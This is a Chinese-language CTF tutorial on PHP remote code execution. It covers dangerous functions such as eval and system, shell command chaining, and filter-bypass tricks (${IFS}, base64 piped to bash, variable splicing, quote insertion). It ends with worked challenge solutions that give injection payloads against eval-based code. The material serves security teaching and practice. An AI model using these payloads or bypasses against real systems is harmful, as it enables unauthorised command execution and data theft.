# lesson1 RCE

---

RCE 指的是 **远程代码执行**（Remote Code Execution）

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=M2Y1NDEyMjIwMzZjZmQzOWRkNDZiYjNjMWFmYTEwYWZfUU1WYzZnTzFUS2xGU0VGQnJaVFZ6NmtUeVNBeTJibU1fVG9rZW46Undud2JYVWNPb25tYzJ4VUFlaGNJSlhybktnXzE3MzYzMzE4NDk6MTczNjMzNTQ0OV9WNA)

说明和介绍：

一些对RCE的介绍

https://www.cloudflare.com/zh-cn/learning/security/what-is-remote-code-execution/

## 简单介绍

CTF中RCE主要的几种类型

1. 任意代码执行
2. 无字母RCE
3. 无参数RCE
4. 无回显命令执行

## PHP中危险函数

#### evel（）函数

`eval()` 函数是 PHP 中一个非常特殊的函数，它可以将一个字符串当作 PHP 代码来执行。这个功能非常强大，但也非常危险，如果使用不当，可能会导致严重的安全问题。

**`eval()`** **函数的语法：**

```PHP
eval ( string $code ) : mixed
```

- `$code`：要执行的 PHP 代码字符串。

**`eval()`** **函数的作用：**

`eval()` 函数会将 `$code` 字符串中的内容解析为 PHP 代码，并执行它。执行的代码会继承 `eval()` 函数所在行的变量作用域。也就是说，在 `eval()` 中可以访问和修改 `eval()` 函数外部的变量。

**`eval()`** **函数的返回值：**

- 如果没有在代码字符串中使用 `return` 语句，则 `eval()` 返回 `NULL`。
- 如果在代码字符串中使用了 `return` 语句，则 `eval()` 返回传递给 `return` 语句的值。
- 从 PHP 7 开始，如果执行的代码中存在解析错误，`eval()` 会抛出 `ParseError` 异常。

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=OWQ1MTg3ZTE5ZjIwYmI4Mzc3ZWZlZWZkY2Y2MmE0OTNfN05EcW1MVUpZZ3VoV0hLajFPZjBONUQ1ak5HT0pIRFpfVG9rZW46WEc3RGJuWkV0b0lCTTh4bmpTVWNNSnRxbmRiXzE3MzYzMzE4NDk6MTczNjMzNTQ0OV9WNA)

### 回显型

#### system()

> https://www.php.net/manual/zh/function.system.php
>
> System
>
> (PHP 4, PHP 5, PHP 7, PHP 8)
>
> system — 执行外部程序，并且显示输出

```PHP
system(string $command, int &$result_code = null): string|false
```

实例代码:

```PHP
<?php
$output = system('ls -l', $retval);
echo "Output:\n" . $output."\n";
echo "Return Value: \n" . $retval;
?>
```

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=MDdlZTlmZTgzNThjZGY3M2YxZTA4NmI1N2Y4MzAwNjJfOWpvVXIyZHhia0lJVkJNQnRGZFRNZDJsekNEWVNzbVdfVG9rZW46S0dEdGJ5RjV5bzlUa2Z4bFoyRGNBM1FiblFoXzE3MzYzMzE4NDk6MTczNjMzNTQ0OV9WNA)

#### Passthru

> https://www.php.net/manual/zh/function.passthru.php
>
> (PHP 4, PHP 5, PHP 7, PHP 8)
>
> passthru — 执行外部程序并且显示原始输出

```PHP
passthru(string $command, int &$result_code = null): ?false
```

实例代码：

```PHP
<?php
passthru("ls /");
passthru("whoami");
```

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=MzZiODE1N2I0ZGU0ZWMzNGUzOTZjMGNmZTE1ZmUwMTlfTDZ5eWV6TDNkeE4xVmlsaExiNnNKcGY1QmJFTWNva3FfVG9rZW46VEZnaGJGSXJsb245bld4UkRyMmNqY2pEbjVNXzE3MzYzMzE4NDk6MTczNjMzNTQ0OV9WNA)

#### pcntl_exec()

> `pcntl_exec()` 是 PHP 的一个函数，用于在 *当前进程空间* 执行指定的程序。它属于 PHP 的 Process Control 扩展（pcntl），主要用于处理 Unix/Linux 系统中的进程管理。与之前提到的 `system()`、`exec()`、`shell_exec()` 等函数不同，`pcntl_exec()` **不会创建新的子进程**，而是 *替换* 当前进程。这意味着调用 `pcntl_exec()` 之后，原来的 PHP 脚本将停止执行，取而代之的是执行指定的程序。

函数原型：

`$path`: 要执行的程序的路径。可以是绝对路径或相对路径。

`$args`: （可选）传递给程序的参数数组。

`$envs`: （可选）传递给程序的环境变量数组。

```PHP
bool pcntl_exec ( string $path [, array $args [, array $envs ]] )
```

几个简单的例子：

```PHP
<?php

// 执行 ls 命令，列出当前目录的文件
pcntl_exec("/bin/ls", ["-l"]);

// 如果 pcntl_exec 执行成功，以下代码不会被执行
echo "This line will not be printed.\n";

?>
```

正常情况下：不会输出回显

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=OWZhY2Q2ZTYzMjAwZTllNWJiYzc5OWM4MDdmNDM5MmZfNWFQeGNPMHM0MmdCSjF0R21reDI3QVRsSHpLc2JKN1JfVG9rZW46R2tEemIzQmxFb3VtQkF4N3NqVmNYRmJlbjhjXzE3MzYzMzE4NDk6MTczNjMzNTQ0OV9WNA)

可以采用：

1. 

![img](https://gitee.com/bx33661/image/raw/master/path/asynccode)

### 无回显

#### exec()

**基本语法：**

```PHP
string exec ( string $command , array &$output = null , int &$return_var = null ) : string
```

- `$command`:  要执行的命令，可以是任何有效的系统命令。
- `$output`:  可选参数，用于存储命令执行的输出结果。每行输出将作为数组的一个元素。
- `$return_var`: 可选参数，用于存储命令执行后的返回状态码。通常，状态码 0 表示命令成功执行。

***函数特性：***

**返回最后一行输出：** `exec()` 函数只返回命令输出的最后一行。

**不显示输出：**  `exec()`  本身不会将命令输出打印到屏幕上。如果需要显示输出，可以使用 `echo` 或 `print_r` 等函数处理 `$output` 数组。

例子：

正常情况下：不会输出回显

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=NTNiN2MwMjM5MzllM2JjZTIwNWJjM2I0OTg5MGM4YTRfcDRTWUx0RW9HbTNwQUtCMkkybkJqT3RqbGFGaDY2eWxfVG9rZW46T0hIU2JjM3pLb1pLcXJ4RDlXWmMxbWN2bkRnXzE3MzYzMzE4NDk6MTczNjMzNTQ0OV9WNA)

可以采用：

1. 保存变量

```PHP
<?php
exec('ls -l', $output);
print_r($output);
```

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=OGJhYTA1YzdiNDMxODE4Y2YyNDM4OTRiOWRjYTFjMzBfaENqT1FveVpPNDJmZmlmSkFmTHZ0dlJ5cHpHUm5vWDBfVG9rZW46R3N0amJ1Z3A5b05GQU14WXIwWGM0T2t1bmRmXzE3MzYzMzE4NDk6MTczNjMzNTQ0OV9WNA)

1. var_dump

> `var_dump()` 是 PHP 中一个非常有用的内置函数，主要用于输出变量的详细信息，包括变量的类型和值。它在调试代码和分析变量状态时非常有用。
>
> **`var_dump()`** **的作用：**
>
> - **显示变量的类型：** 例如，`int`（整型）、`string`（字符串）、`bool`（布尔型）、`array`（数组）、`object`（对象）等。
> - **显示变量的值：** 输出变量的具体内容。
> - **递归展开数组和对象：** 对于数组和对象，`var_dump()` 会递归地显示其内部的元素和属性，并使用缩进清晰地展示其结构。
> - **显示字符串的长度：** 如果变量是字符串，还会显示字符串的长度。

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=N2NiMmJhNTQ1MDAzYzAwYTQ4M2QwNzUzMDIzYTU0MDRfVjBETTU3NFA3c2tVR242MExCem52V1o0RFFrQWV0M1BfVG9rZW46S2E5b2JtaXhHb3BQbmF4UkN3RGNrZ3ZobnpjXzE3MzYzMzE4NDk6MTczNjMzNTQ0OV9WNA)

执行命令

- code .

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=YjJkMDYwMTU3MDUyZmJmOGE0NWE0YmJkZDgzZDJhNGVfYzVEd0NteHcxVEJsTXMwRHdxejRVVmdhQ3BubHIwRUpfVG9rZW46QkNGV2JnaHRTb3JleGN4QzZrVmN1MTM1blJjXzE3MzYzMzE4NDk6MTczNjMzNTQ0OV9WNA)

- calc

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=MTA5YWZkNGYyZWRjZGJlM2Q4NzFhODg1MDg5YjA4N2RfU3FXcmRXSlN1cGNXdWRiZkpaYXVsNmZRVmhzVjlCamlfVG9rZW46QTlUamIzNEhVb3FYbDN4dHFZRmNsOG05bmFoXzE3MzYzMzE4NDk6MTczNjMzNTQ0OV9WNA)

## 技巧

#### 文件读取

**cat**：连接文件并打印到标准输出。这是最常用的查看文件内容的命令，会将整个文件内容一次性显示出来。

- `cat filename`：显示文件内容。
- `cat -n filename`：显示文件内容并显示行号。
- `cat file1 file2`：连接 file1 和 file2 并显示。

**more**：分页显示文件内容。按空格键向下翻页，按 q 键退出。

**less**：与 more 类似，但功能更强大，支持上下翻页（使用 Page Up 和 Page Down 键），搜索等功能。推荐使用 less 代替 more。

**head**：显示文件的前几行，默认显示前 10 行。

- `head filename`：显示文件前 10 行。
- `head -n 20 filename`：显示文件前 20 行。

**tail**：显示文件的后几行，默认显示后 10 行。

- `tail filename`：显示文件后 10 行。
- `tail -n 20 filename`：显示文件后 20 行。
- `tail -f filename`：实时跟踪文件尾部的更新，常用于查看日志文件。

**tac**：反向显示文件内容，从最后一行开始显示，是 cat 的反向操作。

**nl**：显示文件内容并显示行号，类似于 `cat -n`。

**od**：以不同的格式（如八进制、十六进制、二进制等）显示文件内容，常用于查看二进制文件。

- `od -x filename`：以十六进制显示文件内容。
- `od -b filename`：以八进制显示文件内容。

**vi/vim**：文本编辑器，也可以用来查看文件内容。使用 vi/vim 打开文件后，可以使用各种命令进行浏览和编辑。

- `vi filename` 或 `vim filename`：打开文件。
- 在 vi/vim 中，可以使用 `/keyword` 进行搜索，按 n 查找下一个匹配项。

**sort**：对文件内容进行排序后输出。

- `sort filename`：按字母顺序排序。

**uniq**：去除文件中的重复行，通常与 sort 结合使用。

- `sort filename | uniq`：先排序再去重。

**file**：确定文件类型。

- `file filename`：显示文件类型。
- `file -f filelist`：从文件中读取文件名列表并逐个检查文件类型。如果遇到错误，会给出具体的错误信息，这印证了你提到的“报错出具体内容”。

#### 命令拼接符

1. **`;`** **(分号)：** 顺序执行多个命令，彼此之间没有依赖关系。无论前面的命令是否成功执行，后面的命令都会执行。

> **Linux 独有的**

```Bash
//yufa
command1 ; command2 ; command3

ls -l; pwd ; date
```

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=NGE0YzI4ODkzMGJhMTE3ODNjZjA1YjFjYzgwMzZkNTJfckhDUXI2anJjVTEwUzdmVjZsVnNLdzRjVmNpVFZXbXVfVG9rZW46R0I4dGJEMkJ4b2tLVDV4RU9JdWNqSmM1blVoXzE3MzYzMzE4NDk6MTczNjMzNTQ0OV9WNA)

1. **`&&`** **(逻辑与)：** 只有前面的命令执行成功（返回状态码为 0），后面的命令才会执行。如果前面的命令执行失败（返回状态码非 0），则后面的命令不会执行

```Bash
command1 && command2 && command3

mkdir mydir && cd mydir && touch myfile.txt
```

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=ODlmYmFiMmQyMzA2MTA3OWE5OGM1YmE4OGJiNTQxMzdfS29ySDVZTTgxemtaSHJUMWxMSWltaGh3a0tydUNYRmZfVG9rZW46UHhYY2JSQ2lyb3MxSzd4TUFrRmNYUWg2bjVlXzE3MzYzMzE4NDk6MTczNjMzNTQ0OV9WNA)

1. **`||`** **(逻辑或)：** 只有前面的命令执行失败（返回状态码非 0），后面的命令才会执行。如果前面的命令执行成功（返回状态码为 0），则后面的命令不会执行。

```Bash
//yufa
command1 || command2 || command3

ping bx33661.com || echo "Wrong!!!"
```

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=NjJlNjIwYmQ1Y2QwYjdlNjg0ZDBmM2U2YTM3NWZiMjdfTTNuQURkUW5lbmY0bVdPaUlmcmRXSVB0ZmpteUIwMmVfVG9rZW46VjVFWmJDMHlqb094NEp4OGxSdWNpTk56bjFjXzE3MzYzMzE4NDk6MTczNjMzNTQ0OV9WNA)

1. **`|`** **(管道符)：** 将前一个命令的输出作为后一个命令的输入。这用于将多个命令连接起来，形成一个处理数据的流水线。

```Bash
//yufa
command1 | command2 | command3

ls -l | grep "txt" | wc -l
```

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=MjVkMjZjOTA2OGZhN2JkZGVmZmM0MTc2ZWVjZDZjZjRfenNXbnpIaWYzRnc5eXZKcFdIdk9QT285OEpmWURsSWlfVG9rZW46WWM0bmJQVks2b1FRVlB4TFdvMGNwQk8zbjdnXzE3MzYzMzE4NDk6MTczNjMzNTQ0OV9WNA)

## Bypass

#### 空格Bypass

在过滤了空格的系统中，以cat flag.txt为例，系统不允许我们输入空格或输入后被过滤。

- **`${IFS}`**
- ` $IFS$9 `(可以是别的)

> - **`$IFS`**: `$IFS` 是 "Internal Field Separator"（内部字段分隔符）的缩写。它是一个环境变量，用于定义 shell 在解释命令行参数或输入时如何分割字段（单词）。默认情况下，`$IFS` 包含空格、制表符和换行符。简单来说，它告诉 shell 如何区分不同的参数。
> - **`$9`**: `$9` 代表 shell 脚本的第九个命令行参数。如果在执行脚本时提供了九个或更多个参数，`$9` 就会包含第九个参数的值。如果没有提供第九个参数，`$9` 的值为空字符串。
>
> 现在我们来看` $IFS$9 `。它的作用是将 `$IFS` 和 `$9` 连接在一起。由于 `$9` 通常为空字符串，所以 $$IF$$`9` 实际上就等同于 `$IFS`。这个技巧的关键在于如何使用它来绕过空格过滤

可使用${IFS}代替空格。

```PHP
cat${IFS}flag.txt
cat$IFS$1flag.txt
cat${IFS}$1flag.txt
```

- **重定向符绕过(<>)**

```PHP
cat<>flag.txt
cat<flag.txt
```

- **%09(需要php环境)**

php环境下web输入%09等效于空格

```PHP
cat%09flag.txt
```

- **`%0a`****换行符**

#### 编码绕过

#### Base64

```PHP
echo xxxx|base64 -d|bash
```

使用反引号包含base64解码后的命令

```PHP
echo "Y2F0IGZsYWcudHh0Cg==" | base64 -d
```

将base64解码后的命令通过管道符传递给bash

```PHP
echo "Y2F0IGZsYWcudHh0Cg==" | base64 -d | bash
```

#### 变量拼接

使用shell变量拼接被黑名单限制的关键词

```PHP
a=c;b=at;c=fl;d=ag;e=.txt;$a$b $c$d$e;
```

#### 单双引号

- 单引号----`''`
- 双引号---`""`
- 反斜杠--- `\`

我们可以通过`ca''t ca""t c"a"t ca\t`这样来bypass

## 文件包含

...

## 题目：

Base：

1. [SWPUCTF 2021 新生赛]finalrce

https://www.nssctf.cn/problem/438

1. Babyrce

https://www.nssctf.cn/problem/42578

1. Ctfhub-RCE模块

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=YWU1Yzc0ZTY4ZWRhMjViMDZiYzA3NGJlZWMxNGM2NmVfS1o3MjdySWlOMFE2MlBIRWNKMm84ZGtDWGFJcXZEUmhfVG9rZW46UE5pNWI0YlJVb0t5bDV4MGZaUWNCV2JTbmdnXzE3MzYzMzE4NDk6MTczNjMzNTQ0OV9WNA)

https://www.ctfhub.com/#/skilltree

### 示范-WP

#### 第一题

```PHP
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);
    }
```

ban了"flag"这个字符利用匹配

```Python
?c=system("tac fl*");
?c=system("tac fla''g.php");
?c=system("tac fla``g.php");
```

#### 第二题

相比于上一题多ban了`php` , `system`

```Plain
?c=passthru("tac fl*");
```

#### 第三题

```PHP
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
        eval($c);
    }
```

又是多ban了几个东西

```Python
#常规操作
?c=passthru("tac%09fla*");
?c=show_source(next(array_reverse(scandir(pos(localeconv())))));
?c=eval($_GET[a]);&a=system('tac flag.php');#这里只是过滤了c参数里面的内容，利用这个东西可以实现绕过
```

> 简单的解释一下这个`show_source(next(array_reverse(scandir(pos(localeconv())))));`

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=YTAzNDE0YmZiOTU3MGE0YzZmZjhiZDU2ZmZiODA0ZjBfem5vVmViNE5LWmNKWU1kTkFGZ3FyVHdkbjFvMWZDVEVfVG9rZW46VWN5SGI2eENhb1VzQ294SThRU2NsaFJibkZjXzE3MzYzMzE4NDk6MTczNjMzNTQ0OV9WNA)

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=NDU5MzYzNWI2Y2FjN2NiMWRlMWU2OGRiYjc2NDUzN2NfWGV2V0VOOVBSVmJBeXk4SHBPSWU1OUJtZ1c3cmYyWDVfVG9rZW46QXdwUGJmZEpMb2NyTjF4NWZPQWNPQ3VTbkpiXzE3MzYzMzE4NDk6MTczNjMzNTQ0OV9WNA)

`localeconv()` 返回当前地区设置的一个关联数组。

`pos(localeconv())` 获取该数组中的第一个元素。

将该元素作为目录路径，调用 `scandir()` 获取该目录中的文件列表。

反转文件列表（`array_reverse()`）。

返回反转后的文件列表中的下一个元素（`next()`）。

最后，调用 `show_source()` 尝试显示该文件的内容。

## 一些资料

> 更多的面对自己的困惑利用搜索引擎去搜索和查询，同时可以借助大模型提高我们的效率

- Linux命令手册

https://www.freecodecamp.org/chinese/news/the-linux-commands-handbook/

- PHP官方文档

https://www.php.net/manual/zh/index.php

- CTFSHWOW-命令执行题解

https://exp10it.io/2022/08/ctfshow-web%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web29-55-writeup/